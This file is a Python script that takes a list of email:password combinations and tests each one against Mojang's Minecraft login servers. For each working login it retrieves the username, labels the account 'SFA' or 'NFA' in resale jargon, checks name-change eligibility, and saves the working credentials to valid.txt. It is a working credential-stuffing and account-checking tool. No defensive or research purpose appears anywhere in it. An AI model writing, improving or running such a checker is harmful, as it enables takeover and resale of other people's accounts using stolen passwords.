import requests
from requests.api import head, request
import os
from colorama import init, Style, Fore
from datetime import datetime
init()
failedToLogin = True
debugmode = False
token = ''
with open('.\\valid.txt', 'w+') as f:
    f.truncate()
failedToLogin = False
canlogin = []

if os.path.getsize('.\\accounts.txt') > 0:
    pass
else:
    print(f"{Fore.RED}[FAIL]{Style.RESET_ALL} | Please enter accounts in proper format in accounts.txt file")
    os.abort()
def accessToken():
    global token
    global failedToLogin
    payloads = {
    "agent" : "minecraft",
    "username" : email,
    "password" : password,
    "requestUser" : "true"
    }

    headers = {
        "Content-Type" : "application/json"
    }
    responseJSON = requests.post("https://authserver.mojang.com/authenticate", json=payloads, headers=headers)
    response_json = responseJSON.json()
    try:
        token = response_json['accessToken']
        print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} | Successfully logged into {email}")
        if debugmode == True:
            print(response_json)
        failedToLogin = False
        pass
    except:
        failedToLogin = True
        print(f"{Fore.RED}[FAIL]{Style.RESET_ALL} | Failed to login to {email}")
        if debugmode == True:
            print(response_json)
        pass

def checkAccType():
    global AccType
    headers = {
        "Authorization" : f"Bearer {token}"
    }
    r = requests.get("https://api.mojang.com/user", headers=headers)
    if r.status_code == 200:
        AccType = 'SFA'
    else:
        AccType = 'NFA'

def getUsername():
    global username
    headers = {
        "Authorization" : f"Bearer {token}"
    }
    r = requests.get("https://api.minecraftservices.com/minecraft/profile", headers=headers)
    try:
        username = r.json()['name']
    except:
        username = 'Error Trying To Get Username'


def checkNameChange():
    global namechange
    headers = {
        "Authorization" : f"Bearer {token}"
    }
    r = requests.get("https://api.minecraftservices.com/minecraft/profile/namechange", headers=headers)
    if failedToLogin != True:
        if r.json()['nameChangeAllowed'] == True:
            namechange = True
            canlogin.append(email)
            with open('.\\valid.txt', 'a') as f:
                f.write(f'{email}:{password}\n')
            if debugmode == True:
                print(r.json())
        elif r.json()['nameChangeAllowed'] == False:
            namechange = False
            if debugmode == True:
                print(r.json())
        else:
            print(f"{Fore.RED}[FAIL]{Style.RESET_ALL} | Encountered an unexpected error when trying to get info for account: {email}")
            if debugmode == True:
                print(r.json())
    else:
        pass

    r = requests.get("https://api.minecraftservices.com/minecraft/profile/namechange", headers=headers)
with open('.\\accounts.txt', 'r') as f:
    for line in f:
        email, password = line.split(':')
        email = email.strip()
        password = password.strip()
        accessToken()
        checkAccType()
        if failedToLogin == False:
            getUsername()
        checkNameChange()
        if namechange == True:
            namechange = 'True'
        else:
            namechange = 'False'
        if failedToLogin == False:
            print(f"""
Email: {email}
Password: {password}
Username: {username}
Namechange: {namechange}
Account Type: {AccType}
            """)